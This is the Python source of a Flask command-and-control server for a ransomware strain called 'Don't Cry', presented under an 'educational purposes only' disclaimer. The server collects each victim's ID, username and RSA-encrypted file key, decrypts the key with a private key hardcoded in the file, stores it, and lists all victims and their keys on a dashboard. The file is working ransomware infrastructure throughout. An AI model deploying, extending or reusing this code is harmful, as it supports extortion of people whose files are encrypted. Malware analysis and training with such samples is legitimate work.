################################################################################ 
#                             Don't Cry Ransomware                             # 
#                          ! EDUCATIONAL PURPOSES ONLY !                       #
################################################################################
# DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
# research, ethical hacking education, and malware analysis training only.
# It mimics behavior of real ransomware but must NOT be used for illegal or
# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM)
# under supervision of cybersecurity professionals.
# The authors assume no liability for any misuse or damage caused.

import os
import json
import base64
import re
from flask import Flask, request, render_template_string, escape as flask_escape
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

RSA_PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
MIIEqAIBAAKCAQEAjdIcVka2US3tcvXqQ90+XNYt5bJv10x+/0KRSph03Z/RIp/g
OID2EEoF2Gs44BKj1C5UJsP8MyFHhWKob+WVA2vkUca2ZkA4EYxelivKGaEQlUmn
BQJsrmniCu6afj5Gq6mazVPIm48G20g8JS/ckkvJK9TAbLkqk9HQT9waIbhwuByd
KlcpxwPO3CZstFT3YWB+WQS0waPxqbB1PFGqPsYpPM5uBFYKj9aXXec7g6Xg992j
FJ3j8qQ2oi05KRe5OHrMvQNXd7vAfSjzguXKX5gHpY9z8iNTPwU5XBsQCGmQnvxd
tH80fqhDqfh8hZncYtvFGPfJ8g1TfN2huFjYzwIDAQABAoIBAAk38yeYiRlVxu2G
Fqg6pWcbdPhNVP/FtSuahB85Mb+GN+3sPoLtvxDn/uFGdvf5vjR4nne2nZolO6Tr
+M7tOXZzeO/n3steuUZKvYs9ZXGtCorpsrWcprvfnhXf1KMIIUffSnS2UX/rGCMA
2wf/yHKqAnWa6rcmghhu7+/FLINO5Y24lQ4KPA/crWc1LGedG264WWPwP1juKqCk
7JeS9RTSMHlU7doZeay9fW2kK2x+O0ieoYbiIXQzPb5ebuJnD8XLPPyjqxmoHEfd
WuYUFsgosmvVsLbhs+Vqv37RkD8K1wMnJVGCm1ScOkRAKcU9K8zLSsGIdTZmw9hp
81wpcOECgYkAk0baucx17R0bG71CJVXVwa5EeGV4A1EFf/HzabffCO3E9FES5JQl
hWiFB8gy4io5KUMc5VtDdlV+5uWEMellapFBJyv9Z7zcKSEs5qVOZKe4a43SCxFz
gv/JXC2uWTTMbspf2Q5oLw62lLECuZLuXLrkcoee8MdsZkqV03n3YX2L6SafzQUr
DQJ5APaEJZT9ib5LEgA0JFMgpd8Qp/BBnyivw77qbPKRuiEDvxWhtE3jVwKDybP3
IfHFD9gwwaokY33T39Cu/QdGh/K+RmPrLV+0l+DsC9bNQUou44qZelUQncvx9UCC
mkvklkuqqm9NRY/KfXaHrhokXGbH3eIMXmssSwKBiECsTaJneaWNMXlF68UPY1Ww
3BpunHwAWUTtD7Ht74AxQVr0OzKrJ6rk0f4v2MBeQEmxUgAZyo8tThPA2AM+9a0N
ain0dEvYsGlTSy9higJDcIWyenknyazN/DOBT92WhOtl7R8Y54E6mczDymmJbyjD
XUw55/7d4+kreY2rMonaItVYg7X5PgUCeHzqP4T86KSFs8xon5OD8qlS7lZ/WiAq
2HzQm35bO77pABX9B7mEHp4Gm9nWu9ugKMQ7CJenssaa60n6sfrS0aa+pjqRfD+H
6oIt+l3RSmlF00VzOhsKvXsP01/qDjew0DvtcknOFRak2+iJHj7e9/eZBaU68UlL
ewKBiCUQmGSESlvfKEyGkR9h0ieCvM/8xh0WgNqWnLztWtEhF/fTMVkuqFxqrVbc
QgNRtXbP/ulZU8c8xyiIW1O4urxsgEzXB5Fcf870D9g1THPoVCfnQQZNWt1Hblop
rz9v0fKUbjGqZGd/5hMzmWL6Lg2AnsxBXSCjEqm1x6SFuJMMmkmOMkWwANY=
-----END RSA PRIVATE KEY-----"""

app = Flask(__name__)
BASE_FOLDER = os.path.abspath(os.path.expanduser("~/dcry_victims/"))

os.makedirs(BASE_FOLDER, exist_ok=True)


def decrypt_key(encrypted_key):
    private_key = RSA.import_key(RSA_PRIVATE_KEY)
    cipher_rsa = PKCS1_OAEP.new(private_key)
    return cipher_rsa.decrypt(encrypted_key)

def sanitize_path_component(component):
    if not component:
        return "_"
    component = re.sub(r'[^a-zA-Z0-9_-]', '_', component)
    if component == "." or component == "..":
        return "_"
    return component


@app.route("/upload", methods=["POST"])
def upload():
    username = request.form.get("username")
    victim_id_raw = request.form.get("id")
    date = request.form.get("date")
    key_b64_enc = request.form.get("key")

    if not all([username, victim_id_raw, date, key_b64_enc]):
        return "Missing one or more required fields.", 400

    victim_id = sanitize_path_component(victim_id_raw)
    if not victim_id or victim_id == "_":
        return "Invalid victim ID format.", 400

    try:
        encrypted_key = base64.b64decode(key_b64_enc.encode())
    except Exception as e:
        app.logger.error(f"Invalid base64-encoded key for {victim_id}: {e}")
        return "Invalid base64-encoded key format.", 400

    victim_folder_candidate = os.path.join(BASE_FOLDER, victim_id)
    victim_folder_abs = os.path.abspath(victim_folder_candidate)

    if not victim_folder_abs.startswith(BASE_FOLDER + os.sep):
        app.logger.warning(f"Path traversal attempt (upload): victim_id='{victim_id_raw}', sanitized='{victim_id}', candidate='{victim_folder_candidate}', abs='{victim_folder_abs}'")
        return "Invalid victim ID (path traversal attempt detected).", 400
    
    try:
        os.makedirs(victim_folder_abs, exist_ok=True)
    except OSError as e:
        app.logger.error(f"Could not create directory {victim_folder_abs}: {e}")
        return "Server error: Could not create victim directory.", 500

    info_file_path = os.path.join(victim_folder_abs, "info.json")
    key_file_path = os.path.join(victim_folder_abs, "key.txt")

    if not info_file_path.startswith(victim_folder_abs + os.sep) or \
       not key_file_path.startswith(victim_folder_abs + os.sep):
        app.logger.error(f"Internal path safety check failed for victim_id: {victim_id}. Info: {info_file_path}, Key: {key_file_path}, Base: {victim_folder_abs}")
        return "Invalid file path (internal safety check).", 400

    try:
        with open(info_file_path, "w") as f:
            json.dump({"username": username, "id": victim_id, "date": date}, f, indent=2)

        with open(key_file_path, "w") as f:
            f.write(decrypt_key(encrypted_key).decode())
    except IOError as e:
        app.logger.error(f"Error writing files for victim {victim_id}: {e}")
        return "Server error: Could not write victim data.", 500
    except Exception as e:
        app.logger.error(f"Error processing key for victim {victim_id}: {e}")
        return "Error processing key.", 500

    print(f"Saved victim: {victim_id}")
    return f"Victim {flask_escape(victim_id)} received.", 200


@app.route("/dashboard")
def dashboard():
    victims_data = []
    try:
        for vid_raw in os.listdir(BASE_FOLDER):
            vid = sanitize_path_component(vid_raw)
            if not vid or vid == "_":
                continue

            victim_dir_candidate = os.path.join(BASE_FOLDER, vid)
            victim_dir_abs = os.path.abspath(victim_dir_candidate)

            if not os.path.isdir(victim_dir_abs) or \
               not victim_dir_abs.startswith(BASE_FOLDER + os.sep):
                app.logger.warning(f"Skipping non-directory or potential traversal item in dashboard: raw='{vid_raw}', abs='{victim_dir_abs}'")
                continue

            vpath = os.path.join(victim_dir_abs, "info.json")
            kpath = os.path.join(victim_dir_abs, "key.txt")

            if not vpath.startswith(victim_dir_abs + os.sep) or \
               not kpath.startswith(victim_dir_abs + os.sep):
                app.logger.warning(f"Skipping item due to internal path safety check for vid: {vid}")
                continue

            if os.path.exists(vpath) and os.path.exists(kpath):
                try:
                    with open(vpath, "r") as f:
                        info = json.load(f)
                    with open(kpath, "r") as f:
                        key = f.read().strip()
                    
                    victims_data.append({
                        "id": info.get("id", "N/A"),
                        "username": info.get("username", "N/A"),
                        "date": info.get("date", "N/A"),
                        "key": key
                    })
                except json.JSONDecodeError:
                    app.logger.warning(f"Could not decode JSON for victim: {vid}")
                except IOError:
                    app.logger.warning(f"Could not read files for victim: {vid}")
    except OSError as e:
        app.logger.error(f"Error listing victims in dashboard: {e}")

    html_template = """
    <!DOCTYPE html>
    <html>
        <head>
            <title>Don't Cry Dashboard</title>
        </head>
        <body style='font-family:monospace;background:#111;color:#eee;padding:20px;'>
            <h1>Victim Dashboard</h1>
            {% if victims %}
                {% for victim in victims %}
                <div style='border:1px solid #444;padding:10px;margin-bottom:10px;border-radius:5px;'>
                    <b>ID:</b> {{ victim.id }}<br>
                    <b>User:</b> {{ victim.username }}<br>
                    <b>Date:</b> {{ victim.date }}<br>
                    <b>Key:</b> <code>{{ victim.key }}</code>
                </div>
                {% endfor %}
            {% else %}
                <p>No victims yet.</p>
            {% endif %}
            {% if error_message %}
                <p style='color:red;'>{{ error_message }}</p>
            {% endif %}
        </body>
    </html>
    """
    error_msg = "Error loading victim data." if 'e' in locals() and isinstance(e, OSError) else None
    return render_template_string(html_template, victims=victims_data, error_message=error_msg)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
